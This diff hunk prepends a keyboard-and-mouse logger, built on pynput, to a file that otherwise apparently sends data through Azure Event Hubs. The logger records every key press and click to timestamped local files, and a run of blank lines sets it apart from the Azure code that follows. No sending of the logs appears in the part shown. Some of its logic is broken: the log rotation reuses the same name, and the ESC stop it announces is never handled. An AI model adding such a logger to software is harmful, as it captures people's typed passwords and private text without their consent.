@@ -1,4 +1,72 @@
 
+import os
+import time
+from pynput import mouse, keyboard
+from datetime import datetime
+
+# Directory and log file path
+log_dir = 'Pawan'
+if not os.path.exists(log_dir):
+    os.makedirs(log_dir)
+
+# Log file size threshold in bytes (10 KB)
+MAX_FILE_SIZE = 10 * 1024
+
+# Function to get the current log file name
+def get_log_filename():
+    current_time = datetime.now().strftime('%Y-%m-%d_%H-%M')
+    return os.path.join(log_dir, f'pawan_{current_time}.log')
+
+# Function to write logs to file
+def write_log(message):
+    log_filename = get_log_filename()
+    
+    # Check if the current log file size exceeds the limit
+    if os.path.exists(log_filename) and os.path.getsize(log_filename) > MAX_FILE_SIZE:
+        log_filename = get_log_filename()  # Create a new log file with the updated name
+
+    # Write the message to the log file
+    with open(log_filename, 'a') as f:
+        f.write(message + '\n')
+
+# Mouse event handler
+def on_click(x, y, button, pressed):
+    if pressed:
+        write_log(f'Mouse clicked at ({x}, {y}) with {button}')
+    else:
+        write_log(f'Mouse released at ({x}, {y}) with {button}')
+
+# Keyboard event handler
+def on_press(key):
+    try:
+        write_log(f'Key pressed: {key.char}')
+    except AttributeError:
+        write_log(f'Special key pressed: {key}')
+
+# Collect events
+def start_logging():
+    # Start mouse listener
+    with mouse.Listener(on_click=on_click) as mouse_listener:
+        # Start keyboard listener
+        with keyboard.Listener(on_press=on_press) as keyboard_listener:
+            print("Logging mouse and keyboard events. Press ESC to stop.")
+            # Join listeners to keep the program running
+            mouse_listener.start()
+            keyboard_listener.join()
+
+if __name__ == '__main__':
+    start_logging()
+
+
+
+
+
+
+
+
+
+
+
 from azure.identity import ClientSecretCredential
 from azure.eventhub import EventHubProducerClient, EventData
 import json
